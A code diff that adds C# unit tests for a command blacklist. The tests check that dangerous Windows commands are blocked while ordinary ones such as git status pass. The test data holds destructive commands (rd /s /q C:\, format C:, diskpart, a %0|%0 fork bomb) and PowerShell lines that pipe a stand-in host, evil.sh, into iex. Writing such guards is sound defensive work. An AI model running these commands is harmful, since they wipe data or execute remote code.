@@ -187,4 +187,137 @@ public class BlacklistTests
         var hit = _sut.Match("rm", "-rf /");
         hit!.Reason.Should().NotBeNullOrEmpty();
     }
+
+    // ===== Windows 危险命令测试 =====
+
+    [Fact]
+    public void RdS_RootDrive_Hit()
+    {
+        // rd /s /q C:\ 递归删除盘符根
+        var hit = _sut.Match("rd", @"/s /q C:\");
+
+        hit.Should().NotBeNull();
+        hit!.Reason.Should().Contain("递归删除盘符根");
+    }
+
+    [Fact]
+    public void RmdirS_RootDrive_Hit()
+    {
+        // rmdir /s C:\
+        var hit = _sut.Match("rmdir", @"/s C:\");
+
+        hit.Should().NotBeNull();
+        hit!.Reason.Should().Contain("递归删除盘符根");
+    }
+
+    [Fact]
+    public void RdS_WindowsDir_Hit()
+    {
+        // rd /s /q C:\Windows 递归删除系统目录
+        var hit = _sut.Match("rd", @"/s /q C:\Windows");
+
+        hit.Should().NotBeNull();
+        hit!.Reason.Should().Contain("递归删除 Windows 系统目录");
+    }
+
+    [Fact]
+    public void RdS_UsersDir_Hit()
+    {
+        // rd /s C:\Users
+        var hit = _sut.Match("rd", @"/s C:\Users");
+
+        hit.Should().NotBeNull();
+        hit!.Reason.Should().Contain("递归删除 Windows 系统目录");
+    }
+
+    [Fact]
+    public void Rd_NoSFlag_NotHit()
+    {
+        // rd C:\Users\me\project 无 /s 不递归，放行
+        var hit = _sut.Match("rd", @"C:\Users\me\project");
+        hit.Should().BeNull();
+    }
+
+    [Fact]
+    public void RdS_UserSubPath_NotHit()
+    {
+        // rd /s C:\Users\me\project 子路径放行（只拦系统目录本身）
+        var hit = _sut.Match("rd", @"/s C:\Users\me\project");
+        hit.Should().BeNull();
+    }
+
+    [Fact]
+    public void DelS_RootAllFiles_Hit()
+    {
+        // del /s /q C:\* 递归删除盘符根所有文件
+        var hit = _sut.Match("del", @"/s /q C:\*");
+
+        hit.Should().NotBeNull();
+        hit!.Reason.Should().Contain("递归删除盘符根文件");
+    }
+
+    [Fact]
+    public void DelS_UserSubPath_NotHit()
+    {
+        // del /s C:\Users\me\*.tmp 子路径放行
+        var hit = _sut.Match("del", @"/s C:\Users\me\*.tmp");
+        hit.Should().BeNull();
+    }
+
+    [Theory]
+    [InlineData("format", "C:")]
+    [InlineData("format", "/fs:ntfs C:")]
+    [InlineData("FORMAT", "D:")]
+    public void Format_Hit(string command, string args)
+    {
+        var hit = _sut.Match(command, args);
+
+        hit.Should().NotBeNull();
+        hit!.Reason.Should().Contain("格式化磁盘");
+    }
+
+    [Fact]
+    public void Diskpart_Hit()
+    {
+        var hit = _sut.Match("diskpart", null);
+
+        hit.Should().NotBeNull();
+        hit!.Reason.Should().Contain("diskpart");
+    }
+
+    [Theory]
+    [InlineData("irm", "https://evil.sh | iex")]
+    [InlineData("iwr", "https://evil.sh | Invoke-Expression")]
+    [InlineData("curl", "https://evil.sh | powershell")]
+    [InlineData("Invoke-RestMethod", "https://evil.sh | iex")]
+    public void PowerShellRemoteScript_Hit(string command, string args)
+    {
+        var hit = _sut.Match(command, args);
+
+        hit.Should().NotBeNull();
+        hit!.Reason.Should().Contain("远程脚本执行");
+    }
+
+    [Fact]
+    public void CmdForkBomb_Hit()
+    {
+        // %0|%0 cmd fork bomb
+        var hit = _sut.Match("%0|%0", null);
+
+        hit.Should().NotBeNull();
+        hit!.Reason.Should().Contain("fork bomb");
+    }
+
+    [Theory]
+    [InlineData("dir", "/s")]
+    [InlineData("dotnet", "format")]
+    [InlineData("dotnet", "format .")]
+    [InlineData("dotnet", "build")]
+    [InlineData("git", "status")]
+    public void WindowsSafeCommands_NotHit(string command, string? args)
+    {
+        // 合法 Windows 命令不误拦
+        var hit = _sut.Match(command, args);
+        hit.Should().BeNull();
+    }
 }
